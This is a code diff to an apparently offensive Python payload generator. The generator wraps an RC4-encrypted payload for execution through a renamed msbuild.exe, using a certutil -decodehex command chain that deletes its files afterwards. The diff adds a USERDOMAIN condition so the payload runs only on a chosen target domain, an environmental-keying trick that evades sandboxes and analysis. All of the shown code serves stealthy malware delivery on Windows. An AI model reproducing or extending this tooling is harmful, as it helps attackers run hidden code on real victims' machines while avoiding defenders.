@@ -113,6 +113,12 @@ class Generator:
 			msbuild = self.gen_str(random.randrange(5, 25)) + ".exe"
 		payload += " && certutil -decodehex %s %s && copy msbuild.exe %s && %s %s && del %s && del %s && del %s" % (filepath[0], filepath[1], msbuild, msbuild, filepath[1], msbuild, filepath[1], filepath[0])
 		return payload
+		
+	def set_condition(self, data, value = ""):
+		if value == "":
+			return data.replace("[CONDITION]", "")
+		else:
+			return data.replace("[CONDITION]", ' Condition="\'$(USERDOMAIN)\'==\'%s\'"' % value)
 
 class RC4:
 
@@ -175,6 +181,9 @@ if __name__ == "__main__":
 		cipher = base64.b64encode(rc4.Encrypt(data, key))
 		output = gen.get_output()
 		output = output.replace("[KEY]", gen.format_rc4_key(key)).replace("[PAYLOAD]", cipher)
+		condition = gen.capture_input("Set USERDOMAIN condition (Default '')", 3).strip()
+		output = gen.set_condition(output, condition)
+		
 		try:
 			open(outfile, "wb").write(output)
 		except:
